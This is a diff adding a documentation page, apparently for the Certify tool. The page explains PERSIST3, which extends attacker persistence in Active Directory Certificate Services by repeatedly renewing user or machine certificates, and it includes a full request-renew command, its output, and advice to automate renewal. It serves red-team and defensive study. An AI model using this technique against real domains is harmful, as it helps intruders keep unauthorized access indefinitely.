@@ -1,0 +1,101 @@
+---
+title: 'PERSIST3 - Account Persistence via Certificate Renewal'
+description: 'Learn how to extend the lifetime of persistence obtained through PERSIST1 or PERSIST2 by continuously renewing certificates before expiration.'
+icon: 'arrows-rotate'
+sidebarTitle: 'PERSIST3 - Account Persistence via Certificate Renewal'
+---
+
+PERSIST3 is a technique used to extend the lifetime of persistence obtained through [PERSIST1 - User Persistence via Certificates](./persist1-user-persistence-via-certificates) or [PERSIST2 - Machine Persistence via Certificates](./persist2-machine-persistence-via-certificates). Certificate templates have a `Validity Period` attribute that determines for how long an issued certificate can be used as well as a `Renewal Period` attribute that determines for how long an issued certificate can be renewed.
+
+## Understanding Certificate Validity and Renewal Periods
+
+If we look at the `User` and `Machine` templates displayed in [PERSIST1](./persist1-user-persistence-via-certificates) or [PERSIST2](./persist2-machine-persistence-via-certificates), we see that they have the default values for `Validity Period` (1 year) and `Renewal Period` (6 weeks). This effectively means that certificates issued from these templates can be used for 1 year, but can only be renewed in the first 6 weeks after being issued.
+
+```diff
+    Template Name                         : User
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 1
++   Validity Period                       : 1 year
++   Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+    Template Name                         : Machine
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 1
++   Validity Period                       : 1 year
++   Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    Enrollment Flag                       : AUTO_ENROLLMENT
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
+    Extended Key Usage                    : Client Authentication, Server Authentication
+    Certificate Application Policies      : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CORP\Domain Computers           S-1-5-21-976219687-1556195986-4104514715-515
+      Object Control Permissions
+```
+
+<Info>
+If you continuously renew a certificate before expiration of the `Renewal Period`, you can extend your persistence indefinitely.
+</Info>
+
+## Certificate Renewal Process
+
+This can be done using the `request-renew` command from Certify.
+
+```
+> Certify.exe request-renew --ca ca01.corp.local\corp-CA01-CA --cert-pfx MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate renewal
+
+[*] Current user context    : CORP\lowpriv
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 2
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.8915965
+```
+
+<Warning>
+Certificate renewal must be performed within the `Renewal Period` (typically 6 weeks) after the original certificate was issued. If this window expires, you will need to request a new certificate using the original PERSIST1 or PERSIST2 techniques.
+</Warning>
+
+## Maintaining Indefinite Persistence
+
+By setting up an automated process to renew certificates before the renewal period expires, an attacker can maintain persistence indefinitely, as long as:
+
+1. The certificate template remains available and unchanged
+2. The user or machine account retains enrollment rights
+3. The Certificate Authority remains accessible
+4. The renewal is performed within the designated renewal period
+
+<Tip>
+Consider automating the renewal process to ensure persistence is maintained without manual intervention. This can be achieved through scheduled tasks or other automation mechanisms.
+</Tip>
